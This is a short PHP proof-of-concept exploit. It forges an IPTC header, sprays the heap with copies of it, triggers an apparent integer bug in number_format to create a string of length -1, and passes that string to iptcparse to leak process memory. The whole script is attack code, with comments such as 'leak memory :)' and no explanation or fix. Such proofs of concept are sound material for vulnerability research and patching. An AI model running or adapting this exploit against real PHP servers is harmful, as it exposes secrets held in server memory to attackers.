<?php
  $READ_LENGTH = 0x1000; // choose leak size
// construct fake iptc header for controlled read
$iptc_hdr =
  "\x1c\x01" . // magic
  "\x00\x80" . // dataset, recnum
  "\x00" .     // padding
  pack("N", $READ_LENGTH);
// spray a bit so it's near the broken string
$holder = [];
for($i = 0; $i < 100; $i++)
  $holder[] = str_pad($iptc_hdr, 96);
// trigger bug to create string with len=-1
$badstr = number_format(0,0x7fffffff);
var_dump($badstr);
// leak memory :)
$tmp = iptcparse($badstr);
var_dump($tmp);
?>
